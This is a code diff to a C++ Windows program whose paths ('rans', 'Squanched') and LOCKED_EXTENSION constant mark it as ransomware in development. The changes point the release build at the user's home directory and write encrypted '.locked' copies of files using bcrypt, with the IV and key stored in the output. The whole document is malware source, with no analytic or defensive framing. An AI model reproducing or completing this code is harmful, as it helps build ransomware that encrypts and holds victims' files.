@@ -12,8 +12,8 @@
 #	include <Urlmon.h>
 #	include <Lmcons.h>
 #	include <winternl.h>
-#	include <ntstatus.h>
-#	include <winerror.h>
+//#	include <ntstatus.h>
+//#	include <winerror.h>
 #	include <bcrypt.h>
 #	include <cstdio>
 #	include <sal.h>
@@ -39,12 +39,12 @@ int main(int argc, char* argv[]) {
 //	crypt_data* d = generatekey();//TODO also move to encrypt
 
 #ifdef DEBUG
-	string path = "c:\\rans\\236499\\Squanched\\Debug\\testDir";
+	string path = "c:\\rans\\236499\\Squanched\\Debug\\rans.txt";
 #else
 	string path = get_home();
 #endif
 
-	iterate(path);
+	encrypt(path);
 //	iterate(path);
 
 //#ifdef DEBUG
@@ -91,18 +91,17 @@ DWORD generateKeyAndIV(PBYTE* iv, PBYTE* key)
 void encrypt(string path) 
 {
 	DWORD status;
-	string cipher;
-	string plain;
 
 	size_t plainTextLen = getFileSize(path);
 	std::ifstream plaintextFile;
 	plaintextFile.open(path, std::ios::binary);
-	BYTE* plainText = new BYTE[plainTextLen];
+	BYTE* plainText = new BYTE[plainTextLen+1];
 	char c;
 	for (size_t i = 0; i < plainTextLen; ++i) {
 		plaintextFile.get(c);
 		plainText[i] = c;
 	}
+	plainText[plainTextLen] = '\0';
 	plaintextFile.close();
 
 	PBYTE iv =  (PBYTE)HeapAlloc(GetProcessHeap(),0,IV_LEN);
@@ -116,15 +115,11 @@ void encrypt(string path)
 	//keep in persistant file
 
 
-
 #ifdef DEBUG
 	// Print key and initialization vector
 	std::cout << "Key:\t\t" << key << std::endl;
-
 	std::cout << "IV:\t\t" << iv << std::endl;
-
 	std::cout << "PALINTEXT LEN : \t\t" << plainTextLen << std::endl;
-
 	std::cout << "Plaintext:\t" <<(char*) plainText << std::endl;
 #endif
 	
@@ -176,7 +171,9 @@ void encrypt(string path)
 	std::cout << "Ciphertext:\t" << cipherText << std::endl;
 #endif
 	std::ofstream ofile((path + LOCKED_EXTENSION).c_str(), std::ios::binary);
-	ofile.write((char*) cipherText, resSize);
+	ofile.write((char*)iv, IV_LEN);
+	ofile.write((char*)key, KEY_LEN);
+	ofile.write((char*)cipherText, cipherSize);
 	ofile.close();
 
 	delete plainText;
